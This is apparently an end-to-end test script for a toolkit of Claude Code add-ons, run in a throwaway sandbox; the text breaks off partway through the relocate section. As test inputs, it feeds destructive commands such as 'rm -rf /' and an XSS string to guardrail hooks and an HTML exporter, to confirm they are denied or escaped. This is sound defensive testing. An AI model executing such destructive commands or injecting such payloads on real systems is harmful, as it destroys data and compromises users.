#!/usr/bin/env node
// End-to-end test of the whole toolkit, as a new user would meet it: every tool is fetched from
// GitHub with npx (or git clone), installed into ONE fresh Claude Code config folder next to
// settings a user already had, and every hook is run exactly as settings.json says, with the JSON
// Claude Code sends. Then each tool is uninstalled and the settings must be back to the start.
//
//   node e2e/run.mjs            everything (needs network and git)
//   node e2e/run.mjs --local    use the sibling checkouts in ../ instead of GitHub
//   node e2e/run.mjs --only glow,guardrails
//
// Nothing outside a temporary folder is read or written: HOME, USERPROFILE and CLAUDE_CONFIG_DIR
// point into it, and git runs with an empty global config.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const args = process.argv.slice(2);
const LOCAL = args.includes("--local");
const onlyAt = args.indexOf("--only");
const only = onlyAt >= 0 ? (args[onlyAt + 1] || "").split(",").filter(Boolean) : [];
const want = (name) => !only.length || only.includes(name);
const HERE = path.dirname(fileURLToPath(import.meta.url));
const SIBLINGS = path.resolve(HERE, "..", "..");

// ---- a sandbox that looks like a new user's machine --------------------------------------------
const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "tk-")));
const home = path.join(base, "h");
const cfg = path.join(home, ".claude");
fs.mkdirSync(cfg, { recursive: true });
const gitcfg = path.join(base, "gitconfig");
fs.writeFileSync(gitcfg, "[user]\n\tname = E2E\n\temail = e2e@example.com\n[init]\n\tdefaultBranch = main\n");
const ENV = {
  ...process.env, HOME: home, USERPROFILE: home, CLAUDE_CONFIG_DIR: cfg, NO_COLOR: "1",
  GIT_CONFIG_GLOBAL: gitcfg, GIT_CONFIG_NOSYSTEM: "1", GIT_TERMINAL_PROMPT: "0",
  npm_config_yes: "true", npm_config_update_notifier: "false", npm_config_fund: "false", npm_config_audit: "false",
};
delete ENV.CLAUDE_CODE_SESSION_ID;
delete ENV.CLAUDECODE;

const ORIGINAL = { theme: "dark", env: { MY_VAR: "1" }, permissions: { allow: ["Bash(npm test)"] }, hooks: { Stop: [{ hooks: [{ type: "command", command: "node", args: ["-e", "0"] }] }] } };
fs.writeFileSync(path.join(cfg, "settings.json"), JSON.stringify(ORIGINAL, null, 2) + "\n");

// ---- running things --------------------------------------------------------------------------
const results = [];
function check(area, what, ok, detail = "") {
  results.push({ area, what, ok: !!ok, detail });
  console.log(`${ok ? "PASS" : "FAIL"}  ${area.padEnd(12)} ${what}${detail && !ok ? `\n      ${String(detail).slice(0, 2000)}` : ""}`);
}
function run(cmd, argv, { cwd = base, input, env = {}, shell = false, timeout = 240000 } = {}) {
  const t = Date.now();
  const r = spawnSync(cmd, argv, { cwd, input, env: { ...ENV, ...env }, encoding: "utf8", shell, timeout, windowsHide: true });
  return { code: r.status, out: r.stdout || "", err: `${r.stderr || ""}${r.error ? r.error.message : ""}`, ms: Date.now() - t };
}
const NPX = process.platform === "win32" ? "npx.cmd" : "npx";
// On Windows a .cmd shim (npx, an npm-installed claude) needs a shell, so quote one command line.
function runCmd(cmd, argv, opts) {
  if (process.platform !== "win32" || /\.exe$/i.test(cmd)) return run(cmd, argv, opts);
  const quoted = [cmd, ...argv].map((a) => (/[\s"&|<>^]/.test(a) ? `"${a.replace(/"/g, '\\"')}"` : a)).join(" ");
  return run(quoted, [], { ...opts, shell: true });
}
// A tool's command line: npx from GitHub, or the sibling checkout with --local.
function tool(repo, bin, argv, opts) {
  if (LOCAL) return run(process.execPath, [path.join(SIBLINGS, repo, bin), ...argv], opts);
  return runCmd(NPX, ["-y", `github:nrzz/${repo}`, ...argv], opts);
}
const readSettings = () => JSON.parse(fs.readFileSync(path.join(cfg, "settings.json"), "utf8"));
const git = (argv, cwd) => run("git", argv, { cwd });

// Every hook a settings.json lists for an event, run the way Claude Code runs it.
function runHooks(event, payload, { cwd = base, env = {}, match = () => true } = {}) {
  const outs = [];
  for (const group of readSettings().hooks?.[event] || []) {
    for (const h of group.hooks || []) {
      if (h.type !== "command" || !match(h)) continue;
      const input = JSON.stringify({ session_id: "e2e-session", transcript_path: "", cwd, hook_event_name: event, ...payload });
      const r = Array.isArray(h.args) ? run(h.command, h.args, { cwd, input, env }) : run(h.command, [], { cwd, input, env, shell: true });
      outs.push({ hook: [h.command, ...(h.args || [])].join(" "), ...r });
    }
  }
  return outs;
}
const ours = (name) => (h) => JSON.stringify(h).includes(name);
const parse = (s) => { try { return JSON.parse(s); } catch { return null; } };

// A transcript in Claude Code's format, with usage, for cost-guard and session-replay.
function writeSession(projectDir, id, { prompts = 3, model = "claude-sonnet-5-5", day = new Date() } = {}) {
  const slug = projectDir.replace(/[^a-zA-Z0-9]/g, "-");
  const dir = path.join(cfg, "projects", slug);
  fs.mkdirSync(dir, { recursive: true });
  const lines = [];
  let parent = null;
  const t0 = new Date(day).getTime() - (prompts * 2 + 5) * 60000; // just finished
  for (let i = 0; i < prompts; i++) {
    const u = `${id.slice(0, 8)}-u-${i}`, a = `${id.slice(0, 8)}-a-${i}`;
    const at = (k) => new Date(t0 + (i * 2 + k) * 60000).toISOString();
    lines.push({ type: "user", uuid: u, parentUuid: parent, sessionId: id, cwd: projectDir, timestamp: at(0), isSidechain: false, message: { role: "user", content: `Step ${i}: please refactor module ${i} <script>alert(1)</script>` } });
    lines.push({ type: "assistant", uuid: a, parentUuid: u, sessionId: id, cwd: projectDir, timestamp: at(1), isSidechain: false, requestId: `req_${id.slice(0, 8)}_${i}`, message: { id: `msg_${i}`, model, role: "assistant", content: [{ type: "text", text: `Done with module ${i}.` }], usage: { input_tokens: 20000, output_tokens: 3000, cache_read_input_tokens: 100000, cache_creation_input_tokens: 10000 } } });
    parent = a;
  }
  lines.push({ type: "custom-title", customTitle: "E2E refactor session", sessionId: id });
  fs.writeFileSync(path.join(dir, `${id}.jsonl`), lines.map((l) => JSON.stringify(l)).join("\n") + "\n");
}

// =================================================================================================
console.log(`toolkit e2e: ${LOCAL ? "local checkouts" : "fetched from GitHub"}; sandbox ${base}\n`);
const project = path.join(base, "web");
fs.mkdirSync(project, { recursive: true });
fs.writeFileSync(path.join(project, "package.json"), JSON.stringify({ name: "web", scripts: { test: "node --test", lint: "node -e 0", build: "node -e 0" } }, null, 2));
git(["init", "-q"], project);

// ---- glow: status line and themes ---------------------------------------------------------------
if (want("glow")) {
  const r = tool("claude-code-glow", "bin/claude-glow.mjs", ["install", "--theme", "dracula"]);
  check("glow", "install from scratch", r.code === 0, r.out + r.err);
  const s = readSettings();
  check("glow", "statusLine set, other settings kept", s.statusLine?.command?.includes("statusline.mjs") && s.theme === "dark" && s.env?.MY_VAR === "1", JSON.stringify(s.statusLine));
  check("glow", "15 UI themes and the live theme written", fs.readdirSync(path.join(cfg, "themes")).filter((f) => f.startsWith("glow")).length >= 15);
  const sample = { model: { display_name: "Opus" }, workspace: { current_dir: project }, cost: { total_cost_usd: 1.2 }, context_window: { context_window_size: 1000000, used_percentage: 62 } };
  const sl = run(s.statusLine.command, [], { cwd: project, input: JSON.stringify(sample), shell: true });
  check("glow", "status line runs from settings.json, two lines with a tip", sl.code === 0 && sl.out.trim().split("\n").length === 2 && /Context 62%/.test(sl.out.replace(/\x1b\[[0-9;]*m/g, "")), sl.out + sl.err);
  const t = tool("claude-code-glow", "bin/claude-glow.mjs", ["theme", "set", "nord"]);
  const live = parse(fs.readFileSync(path.join(cfg, "themes", "glow.json"), "utf8"));
  const nord = parse(fs.readFileSync(path.join(cfg, "themes", "glow-nord.json"), "utf8"));
  check("glow", "theme set makes the live theme Nord's colors", t.code === 0 && live?.name === "Glow (live)" && JSON.stringify(live?.overrides) === JSON.stringify(nord?.overrides), t.out + t.err);
}

// ---- guardrails: PreToolUse ----------------------------------------------------------------------
if (want("guardrails")) {
  const r = tool("claude-code-guardrails", "bin/claude-guardrails.mjs", ["init", "--scope", "user"]);
  check("guardrails", "init (user scope)", r.code === 0, r.out + r.err);
  const pre = (tool_name, tool_input) => runHooks("PreToolUse", { tool_name, tool_input }, { cwd: project, match: ours("guardrails") })[0];
  const deny = pre("Bash", { command: "rm -rf /" });
  check("guardrails", "rm -rf / is denied with a reason", parse(deny?.out)?.hookSpecificOutput?.permissionDecision === "deny", deny?.out + deny?.err);
  const allow = pre("Bash", { command: "npm test" });
  check("guardrails", "npm test passes silently", allow?.code === 0 && allow.out.trim() === "", allow?.out + allow?.err);
  const env = pre("Write", { file_path: path.join(project, ".env"), content: "X=1" });
  check("guardrails", "writing .env is denied", parse(env?.out)?.hookSpecificOutput?.permissionDecision === "deny", env?.out);
  check("guardrails", "a hook call stays under a second", (allow?.ms ?? 9999) < 1000, `${allow?.ms} ms`);
}

// ---- notify: UserPromptSubmit, Stop, Notification ------------------------------------------------
if (want("notify")) {
  const r = tool("claude-code-notify", "bin/claude-notify.mjs", ["init"]);
  check("notify", "init (user scope)", r.code === 0, r.out + r.err);
  const now = Date.now();
  runHooks("UserPromptSubmit", { prompt: "build it", source: "user" }, { cwd: project, match: ours("notify"), env: { CLAUDE_NOTIFY_NOW: String(now) } });
  const quick = runHooks("Stop", { stop_hook_active: false }, { cwd: project, match: ours("notify"), env: { CLAUDE_NOTIFY_NOW: String(now + 5000) } })[0];
  check("notify", "a 5-second turn stays quiet", quick?.code === 0 && quick.out.trim() === "", quick?.out);
  runHooks("UserPromptSubmit", { prompt: "build it", source: "user" }, { cwd: project, match: ours("notify"), env: { CLAUDE_NOTIFY_NOW: String(now + 10000) } });
  const long = runHooks("Stop", { stop_hook_active: false }, { cwd: project, match: ours("notify"), env: { CLAUDE_NOTIFY_NOW: String(now + 70000) } })[0];
  const seq = parse(long?.out)?.terminalSequence || "";
  check("notify", "a 60-second turn sends one OSC 9 notification, nothing for the model", /^\u001b\]9;[^\d]/.test(seq) && Object.keys(parse(long.out)).length === 1, long?.out);
  const perm = runHooks("Notification", { message: "Claude needs your permission to use Bash", notification_type: "permission_prompt" }, { cwd: project, match: ours("notify") })[0];
  check("notify", "a permission prompt pings", /permission/.test(parse(perm?.out)?.terminalSequence || ""), perm?.out);
}

// ---- cost-guard: UserPromptSubmit ----------------------------------------------------------------
if (want("cost-guard")) {
  const r = tool("claude-cost-guard", "bin/claude-cost-guard.mjs", ["init"]);
  check("cost-guard", "init", r.code === 0, r.out + r.err);
  writeSession(project, "cccccccc-1111-4111-8111-111111111111", { prompts: 4 });
  const silent = runHooks("UserPromptSubmit", { prompt: "hi", source: "user" }, { cwd: project, match: ours("cost-guard") })[0];
  check("cost-guard", "no budget: silent", silent?.code === 0 && silent.out.trim() === "", silent?.out + silent?.err);
  const b = tool("claude-cost-guard", "bin/claude-cost-guard.mjs", ["budget", "set", "--daily", "0.2usd", "--mode", "hard"]);
  check("cost-guard", "budget set (0.20 USD, hard)", b.code === 0, b.out + b.err);
  const block = runHooks("UserPromptSubmit", { prompt: "hi", source: "user" }, { cwd: project, match: ours("cost-guard") })[0];
  check("cost-guard", "over budget in hard mode: the prompt is held", parse(block?.out)?.decision === "block", block?.out + block?.err);
  const compact = runHooks("UserPromptSubmit", { prompt: "/compact", source: "user" }, { cwd: project, match: ours("cost-guard") })[0];
  check("cost-guard", "/compact still runs when over budget", parse(compact?.out)?.decision !== "block", compact?.out);
  const today = tool("claude-cost-guard", "bin/claude-cost-guard.mjs", ["today"], { cwd: project });
  check("cost-guard", "today reports the spend", today.code === 0 && /\$/.test(today.out), today.out + today.err);
}

// ---- session-replay --------------------------------------------------------------------------------
if (want("replay")) {
  writeSession(project, "eeeeeeee-2222-4222-8222-222222222222", { prompts: 2 });
  const out = path.join(base, "replay.html");
  const r = tool("claude-session-replay", "bin/claude-replay.mjs", ["export", "eeeeeeee", "--out", out], { cwd: project });
  const html = fs.existsSync(out) ? fs.readFileSync(out, "utf8") : "";
  check("replay", "export writes one self-contained page", r.code === 0 && html.includes("Content-Security-Policy") && (html.match(/<script\b/gi) || []).length === 1, r.out + r.err);
  check("replay", "transcript text is escaped", html.includes("&lt;script&gt;alert(1)&lt;/script&gt;") && !/<script>alert/.test(html));
  const s = tool("claude-session-replay", "bin/claude-replay.mjs", ["search", "refactor", "module"], { cwd: project });
  check("replay", "search finds the session", s.code === 0 && /eeeeeeee/.test(s.out), s.out + s.err);
}

// ---- chat-ferry ------------------------------------------------------------------------------------
// An Antigravity-style conversation in a folder the tool reads through ANTIGRAVITY_DIR, imported as
// a Claude Code session, then a Claude Code session exported for Cursor. The marketplace section
// below resumes the imported session with Claude Code itself.
let ferrySession = null;
if (want("chat-ferry")) {
  const ag = path.join(base, "antigravity");
  const logs = path.join(ag, "brain", "e2e00000-0000-4000-8000-000000000001", ".system_generated", "logs");
  fs.mkdirSync(logs, { recursive: true });
  fs.writeFileSync(path.join(logs, "transcript.jsonl"), [
    { step_index: 0, source: "USER_EXPLICIT", type: "USER_INPUT", status: "DONE", created_at: "2026-09-30T10:00:00Z", content: "<USER_REQUEST>\nfix the retry loop in client.go\n</USER_REQUEST>" },
    { step_index: 1, source: "SYSTEM", type: "CONVERSATION_HISTORY", status: "DONE", created_at: "2026-09-30T10:00:01Z" },
    { step_index: 2, source: "MODEL", type: "PLANNER_RESPONSE", status: "DONE", created_at: "2026-09-30T10:00:05Z", content: "The loop never backs off; adding exponential backoff with a 30 second cap." },
  ].map((l) => JSON.stringify(l)).join("\n") + "\n");
  const imp = tool("claude-chat-ferry", "bin/claude-chat-ferry.mjs", ["import", "antigravity:latest"], { cwd: project, env: { ANTIGRAVITY_DIR: ag } });
  const id = /claude --resume ([0-9a-f-]{36})/.exec(imp.out)?.[1] || "";
  const sessionFile = id ? path.join(cfg, "projects", project.replace(/[^A-Za-z0-9]/g, "-"), `${id}.jsonl`) : "";
  check("chat-ferry", "import writes a Claude Code session for the project and prints the resume line", imp.code === 0 && !!id && fs.existsSync(sessionFile), imp.out + imp.err);
  const text = sessionFile && fs.existsSync(sessionFile) ? fs.readFileSync(sessionFile, "utf8") : "";
  check("chat-ferry", "the session holds the banner, the prompt and the answer", text.includes("[Conversation imported from Antigravity") && text.includes("fix the retry loop in client.go") && text.includes("exponential backoff"), text.slice(0, 300));
  if (text) ferrySession = { id, file: sessionFile };
  const exp = tool("claude-chat-ferry", "bin/claude-chat-ferry.mjs", ["export", `claude:${id.slice(0, 8)}`, "--to", "cursor"], { cwd: project });
  const md = /^Wrote (\S+)/m.exec(exp.out)?.[1] || "";
  const mdFile = md ? path.join(project, md) : "";
  check("chat-ferry", "export writes a Markdown file under .ai-chats for Cursor", exp.code === 0 && md.replace(/\\/g, "/").startsWith(".ai-chats/") && fs.existsSync(mdFile) && fs.readFileSync(mdFile, "utf8").includes("## Assistant"), exp.out + exp.err);
  const list = tool("claude-chat-ferry", "bin/claude-chat-ferry.mjs", ["list", "--from", "claude"], { cwd: project });
  check("chat-ferry", "list shows the imported session", list.code === 0 && list.out.includes(id.slice(0, 8)), list.out + list.err);
}

// ---- session-tidy: sessions listed, kept, deleted and restored, and its SessionStart hook ----------------
// Two sessions made old on purpose in the throwaway config: one is kept (which touches it), the other goes
// to the trash and comes back byte for byte. Then init adds the hook, which is run as settings.json lists
// it, and uninstall must give settings.json back exactly as it was.
if (want("session-tidy")) {
  const DAY = 86400000;
  const tidy = (argv, opts) => tool("claude-session-tidy", "bin/claude-session-tidy.mjs", argv, { cwd: project, ...opts });
  const keptId = "d0d0d0d0-6666-4666-8666-666666666666", goneId = "b0b0b0b0-7777-4777-8777-777777777777";
  const fileOf = (id) => path.join(cfg, "projects", project.replace(/[^a-zA-Z0-9]/g, "-"), `${id}.jsonl`);
  const age = (id, days) => { const t = new Date(Date.now() - days * DAY); fs.utimesSync(fileOf(id), t, t); };
  writeSession(project, keptId, { prompts: 3, day: new Date(Date.now() - 20 * DAY) });
  writeSession(project, goneId, { prompts: 2, day: new Date(Date.now() - 10 * DAY) });
  age(keptId, 20);
  age(goneId, 10);

  const listing = parse(tidy(["list", "--json"]).out);
  const row = (id) => listing?.sessions?.find((s) => s.id === id);
  check("session-tidy", "list --json shows both sessions with the days left before the 30-day cleanup",
    Math.abs((row(keptId)?.sweep?.daysLeft ?? -99) - 10) <= 1 && Math.abs((row(goneId)?.sweep?.daysLeft ?? -99) - 20) <= 1, JSON.stringify(listing?.sessions?.map((s) => [s.short, s.sweep])));

  const touched = fs.statSync(fileOf(keptId)).mtimeMs;
  const keep = tidy(["keep", keptId.slice(0, 8), "--json"]);
  check("session-tidy", "keep touches the session, so the cleanup's 30 days start again", keep.code === 0 && fs.statSync(fileOf(keptId)).mtimeMs - touched > 19 * DAY, keep.out + keep.err);

  const original = fs.readFileSync(fileOf(goneId));
  const modified = fs.statSync(fileOf(goneId)).mtimeMs;
  const dry = tidy(["delete", goneId.slice(0, 8), "--dry-run", "--json"]);
  check("session-tidy", "delete --dry-run names the session and moves nothing", dry.code === 0 && parse(dry.out)?.dryRun === true && fs.existsSync(fileOf(goneId)), dry.out + dry.err);
  const del = tidy(["delete", goneId.slice(0, 8), "--json"]);
  check("session-tidy", "delete moves the session to the trash, out of projects/", del.code === 0 && !fs.existsSync(fileOf(goneId)) && fs.existsSync(path.join(cfg, "session-tidy", "trash", goneId, "manifest.json")), del.out + del.err);
  const back = tidy(["restore", goneId.slice(0, 8), "--json"]);
  check("session-tidy", "restore brings it back byte for byte, with its file time", back.code === 0 && fs.existsSync(fileOf(goneId)) && fs.readFileSync(fileOf(goneId)).equals(original) && Math.abs(fs.statSync(fileOf(goneId)).mtimeMs - modified) < 2, back.out + back.err);

  const settingsBefore = fs.readFileSync(path.join(cfg, "settings.json"));
  const init = tidy(["init"]);
  const entries = JSON.stringify(readSettings().hooks?.SessionStart || []).split("session-tidy/app/bin/claude-session-tidy.mjs").length - 1;
  check("session-tidy", "init adds one SessionStart hook that runs the installed copy", init.code === 0 && entries === 1, init.out + init.err + entries);
  age(keptId, 20);
  const hook = runHooks("SessionStart", { source: "startup" }, { cwd: project, match: ours("session-tidy") })[0];
  check("session-tidy", "the hook runs as settings.json lists it, prints nothing, and touches the kept session again", hook?.code === 0 && hook.out === "" && hook.err === "" && Date.now() - fs.statSync(fileOf(keptId)).mtimeMs < DAY, `${hook?.out}${hook?.err}`);
  const un = tidy(["uninstall"]);
  check("session-tidy", "uninstall gives settings.json back byte for byte and removes the program copy, keeping the keep list", un.code === 0 && fs.readFileSync(path.join(cfg, "settings.json")).equals(settingsBefore) && !fs.existsSync(path.join(cfg, "session-tidy", "app")) && fs.existsSync(path.join(cfg, "session-tidy", "keep.json")), un.out + un.err);
}

// ---- permission-doctor: why a prompt appears, dead rules, rules from history ----------------------------
// Its own config folder and project, so the settings checked at the end stay the user's. The settings hold
// a prefix rule, a :* rule, a literal rule nobody uses and a deny. The transcript holds a command that ran
// four times without a rule and two that rules cover. The tool writes only with lint --fix, suggest --write
// and restore, so none of the five runs below may change a file. The marketplace section reuses this folder.
const pd = { cfg: path.join(base, "pd", ".claude"), project: path.join(base, "pd", "app") };
fs.mkdirSync(pd.cfg, { recursive: true });
fs.mkdirSync(pd.project, { recursive: true });
if (want("permission-doctor")) {
  const DAY = 86400000;
  const settingsFile = path.join(pd.cfg, "settings.json");
  fs.writeFileSync(settingsFile, JSON.stringify({ permissions: { allow: ["Bash(npm run *)", "Bash(git status:*)", "Bash(make deploy-staging)"], deny: ["Bash(rm -rf *)"] } }, null, 2) + "\n");
  // lint calls a literal rule dead only when its file is two weeks old and a transcript from the window exists
  const aged = new Date(Date.now() - 30 * DAY);
  fs.utimesSync(settingsFile, aged, aged);
  const transcripts = path.join(pd.cfg, "projects", pd.project.replace(/[^a-zA-Z0-9]/g, "-"));
  fs.mkdirSync(transcripts, { recursive: true });
  const sid = "f0f0f0f0-8888-4888-8888-888888888888";
  const ran = [...Array(4).fill("docker compose up -d"), ...Array(3).fill("git status"), ...Array(3).fill("npm run build")];
  fs.writeFileSync(path.join(transcripts, `${sid}.jsonl`), ran.flatMap((command, i) => {
    const id = `toolu_e2e_${i}`;
    const timestamp = new Date(Date.now() - (ran.length - i) * 3600000).toISOString();
    return [
      { type: "assistant", uuid: `pd-a-${i}`, sessionId: sid, cwd: pd.project, timestamp, message: { role: "assistant", content: [{ type: "tool_use", id, name: "Bash", input: { command } }] } },
      { type: "user", uuid: `pd-u-${i}`, sessionId: sid, cwd: pd.project, timestamp, permissionDecision: { decision: "accept", source: "user_temporary" }, message: { role: "user", content: [{ type: "tool_result", tool_use_id: id, content: "ok" }] } },
    ].map((r) => JSON.stringify(r));
  }).join("\n") + "\n");

  const before = fs.readFileSync(settingsFile);
  const doctor = (argv) => tool("claude-permission-doctor", "bin/claude-permission-doctor.mjs", [...argv, "--project", pd.project], { cwd: pd.project, env: { CLAUDE_CONFIG_DIR: pd.cfg } });
  const runs = {
    show: doctor(["show", "--json"]),
    why: doctor(["why", "git status && npm test", "--json"]),
    deny: doctor(["why", "rm -rf build", "--json"]),
    lint: doctor(["lint", "--json"]),
    suggest: doctor(["suggest", "--json"]),
  };
  const out = (name) => ({ ...(parse(runs[name].out) || {}), ok: runs[name].code === 0 });
  const here = (f) => !!f && path.resolve(f) === path.resolve(settingsFile);

  const show = out("show");
  check("permission-doctor", "show --json lists the four rules with the settings file each is in",
    show.ok && show.summary?.allow === 3 && show.summary.deny === 1 && show.rules?.length === 4 && show.rules.every((r) => here(r.file))
      && ["Bash(npm run *)", "Bash(git status:*)", "Bash(make deploy-staging)", "Bash(rm -rf *)"].every((rule) => show.rules.some((r) => r.rule === rule)), runs.show.out + runs.show.err);
  const why = out("why").decision;
  check("permission-doctor", "why \"git status && npm test\" --json: a verdict that asks, the :* rule allowing git status and no rule covering npm test, with the rule that would stop the prompt",
    out("why").ok && why?.verdict === "ask" && why.parts?.length === 2 && why.parts[0].status === "allow" && why.parts[0].rule?.rule === "Bash(git status:*)"
      && why.parts[1].status === "no-rule" && String(why.fix?.rule).startsWith("Bash(npm test"), runs.why.out + runs.why.err);
  const denied = out("deny").decision;
  check("permission-doctor", "why \"rm -rf build\" --json: denied by the deny rule, named with its file", out("deny").ok && denied?.verdict === "deny" && denied.rule?.rule === "Bash(rm -rf *)" && here(denied.rule.file), runs.deny.out + runs.deny.err);
  const lint = out("lint");
  const dead = (lint.findings || []).filter((f) => f.id === "dead-rule");
  check("permission-doctor", "lint --json finds the literal rule nobody used as dead, and calls no prefix rule dead",
    lint.ok && dead.length === 1 && dead[0].rule === "Bash(make deploy-staging)" && dead[0].autofix === true && lint.summary?.warn >= 1, runs.lint.out + runs.lint.err);
  const suggest = out("suggest");
  check("permission-doctor", "suggest --json proposes a prefix rule for the command that ran four times without one, and none for the commands rules cover",
    suggest.ok && suggest.proposals?.length === 1 && suggest.proposals[0].rule === "Bash(docker compose up *)" && suggest.proposals[0].count === 4, runs.suggest.out + runs.suggest.err);
  check("permission-doctor", "none of the five runs changed a file: settings.json is the same bytes and no backup was made",
    fs.readFileSync(settingsFile).equals(before) && fs.readdirSync(pd.cfg).sort().join() === "projects,settings.json", fs.readdirSync(pd.cfg).join());
}

// ---- hook-bench: every hook of a settings file, run with the JSON Claude Code sends --------------------------
// Its own config folder and project. The settings hold a PreToolUse hook that denies rm -rf, a Stop hook whose
// JSON has a field of the wrong type, a hook under a misspelled event name, and a SessionStart hook that prints
// context. The bench runs them for real (they are node one-liners) and must call each what Claude Code would.
const hb = { cfg: path.join(base, "hb", ".claude"), project: path.join(base, "hb", "app") };
fs.mkdirSync(hb.cfg, { recursive: true });
fs.mkdirSync(hb.project, { recursive: true });
if (want("hook-bench")) {
  const nodeHook = (code) => ({ type: "command", command: process.execPath, args: ["-e", code] });
  fs.writeFileSync(path.join(hb.cfg, "settings.json"), JSON.stringify({
    hooks: {
      PreToolUse: [{ matcher: "Bash", hooks: [nodeHook("const i=JSON.parse(require('fs').readFileSync(0,'utf8')); if(/rm -rf/.test(i.tool_input.command)) process.stdout.write(JSON.stringify({hookSpecificOutput:{hookEventName:'PreToolUse',permissionDecision:'deny',permissionDecisionReason:'no rm -rf'}}))")] }],
      Stop: [{ hooks: [nodeHook("process.stdout.write(JSON.stringify({systemMessage: 5}))")] }],
      PreToolUs: [{ hooks: [nodeHook("0")] }],
      SessionStart: [{ matcher: "startup", hooks: [nodeHook("process.stdout.write('Current branch: main')")] }],
    },
  }, null, 2) + "\n");
  const snapshot = () => fs.readdirSync(hb.cfg, { recursive: true }).map((f) => `${f}:${fs.statSync(path.join(hb.cfg, String(f))).size}`).sort().join(",");
  const before = snapshot();
  const bench = (argv) => tool("claude-hook-bench", "bin/claude-hook-bench.mjs", [...argv, "--project", hb.project], { cwd: hb.project, env: { CLAUDE_CONFIG_DIR: hb.cfg } });
  const list = bench(["list", "--json"]);
  const lm = parse(list.out);
  check("hook-bench", "list --json finds the four hooks and flags the misspelled event, with a suggestion",
    list.code === 0 && lm?.hooks?.length === 4 && lm.hooks.find((h) => h.event === "PreToolUs")?.findings.some((f) => f.severity === "error" && /did you mean PreToolUse/.test(f.message)) && lm.summary.errors === 1, list.out.slice(0, 600) + list.err);
  const quiet = bench(["run", "--json", "--event", "PreToolUse:Bash"]);
  const deny = bench(["run", "--json", "--event", "PreToolUse:Bash", "--command", "rm -rf /tmp/build"]);
  const qm = parse(quiet.out);
  const dm = parse(deny.out);
  check("hook-bench", "run: the deny hook is silent on npm test and denies rm -rf, with its reason",
    quiet.code === 0 && qm?.runs?.length === 1 && qm.runs[0].verdict.outcome === "silent" && deny.code === 0 && dm?.runs?.length === 1 && dm.runs[0].verdict.outcome === "block" && /no rm -rf/.test(dm.runs[0].verdict.effects.join(" ")),
    quiet.out.slice(0, 400) + quiet.err + deny.out.slice(0, 400) + deny.err);
  const all = bench(["run", "--json"]);
  const am = parse(all.out);
  const stop = am?.runs?.find((r) => r.event === "Stop");
  const start = am?.runs?.find((r) => r.event === "SessionStart");
  const typo = am?.runs?.find((r) => r.event === "PreToolUs");
  check("hook-bench", "run: the wrong-typed systemMessage is a non-blocking error with the field named, the context hook adds context, the misspelled hook is skipped",
    all.code === 0 && stop?.verdict.outcome === "error" && /systemMessage: expected string, received number/.test(stop.verdict.problems.join(" ")) && start?.verdict.outcome === "context" && typo?.skipped && am.summary.runs === 3,
    all.out.slice(0, 800) + all.err);
  const failOn = bench(["run", "--fail-on", "error"]);
  check("hook-bench", "run --fail-on error exits 1 because of the invalid output and the misspelled event", failOn.code === 1, `exit ${failOn.code}: ${failOn.out.slice(-300)}${failOn.err}`);
  const explain = bench(["explain", "1"]);
  check("hook-bench", "explain 1 prints the JSON the hook gets and how its answer is read", explain.code === 0 && /"hook_event_name": "PreToolUse"/.test(explain.out) && /exit 2: blocks/.test(explain.out), explain.out.slice(0, 400) + explain.err);
  check("hook-bench", "none of the runs changed a file under the config folder", snapshot() === before, snapshot());
}

// ---- relocate: the config folder moved to another folder and back ---------------------------------------------
// Its own home folder: a config folder with settings, a session, a plugin file and a .claude.json, moved to a
// sibling folder with --no-env (so no shell profile and no Windows user environment outside the sandbox changes)
// and --ignore-running (a Claude Code may be open on the machine that runs this; the sandbox is not its folder),
// then put back with undo. Every file must come back byte for byte, and the dry run and the run without --yes
// must change nothing.
if (want("relocate")) {
  const rlHome = path.join(base, "rl");
  const rlCfg = path.join(rlHome, ".claude");
  const rlDest = path.join(rlHome, "moved-claude");
  fs.mkdirSync(path.join(rlCfg, "projects", "-work-app"), { recursive: true });
  fs.mkdirSync(path.join(rlCfg, "plugins", "cache"), { recursive: true });
  fs.writeFileSync(path.join(rlCfg, "settings.json"), JSON.stringify(ORIGINAL, null, 2) + "\n");
  fs.writeFileSync(path.join(rlCfg, "projects", "-work-app", "11111111-2222-4333-8444-555555555555.jsonl"), '{"type":"user","message":{"role":"user","content":"hello"}}\n');
  fs.writeFileSync(path.join(rlCfg, "plugins", "cache", "index.json"), "{}\n");
  fs.writeFileSync(path.join(rlCfg, ".claude.json"), JSON.stringify({ hasCompletedOnboarding: true }) + "\n");
  const rlEnv = { HOME: rlHome, USERPROFILE: rlHome, CLAUDE_CONFIG_DIR: rlCfg };
  const relocate = (argv, env = {}) => tool("claude-relocate", "bin/claude-relocate.mjs", argv, { cwd: rlHome, env: { ...rlEnv, ...env } });
  // Every name and every byte below a folder, except the tool's own manifest.
  const tree = (dir) => (fs.existsSync(dir) ? fs.readdirSync(dir, { recursive: true }) : []).map(String).filter((f) => !/relocate-manifest\.json$/.test(f)).map((f) => {
    const p = path.join(dir, f);
    const st = fs.lstatSync(p);
    return `${f.replace(/\\/g, "/")}:${st.isDirectory() ? "dir" : st.isSymbolicLink() ? "link" : fs.readFileSync(p).toString("base64")}`;
  }).sort().join("\n");
  const before = tree(rlCfg);
  const plan = relocate(["plan", "--to", rlDest, "--json"]);
  const pm = parse(plan.out);
  check("relocate", "plan --json sorts the folder into kinds with their sizes, names the destination and finds nothing wrong",
    plan.code === 0 && pm?.ok === true && pm.problems?.length === 0 && pm.total?.files === 4 && ["settings", "sessions", "pluginCache", "claudeJson"].every((k) => pm.kinds?.some((x) => x.kind === k && x.files === 1))
      && path.resolve(pm.destination?.config || "") === path.resolve(rlDest), plan.out.slice(0, 800) + plan.err);
  const dry = relocate(["move", "--to", rlDest, "--no-env", "--ignore-running", "--dry-run", "--json"]);
  check("relocate", "move --dry-run lists its steps and changes nothing", dry.code === 0 && parse(dry.out)?.dryRun === true && tree(rlCfg) === before && !fs.existsSync(rlDest), dry.out.slice(0, 400) + dry.err);
  const noYes = relocate(["move", "--to", rlDest, "--no-env", "--ignore-running", "--json"]);
  check("relocate", "move without --yes refuses and changes nothing", noYes.code === 1 && parse(noYes.out)?.needsYes === true && tree(rlCfg) === before && !fs.existsSync(rlDest), noYes.out.slice(0, 400) + noYes.err);
  const mv = relocate(["move", "--to", rlDest, "--no-env", "--ignore-running", "--yes", "--json"]);
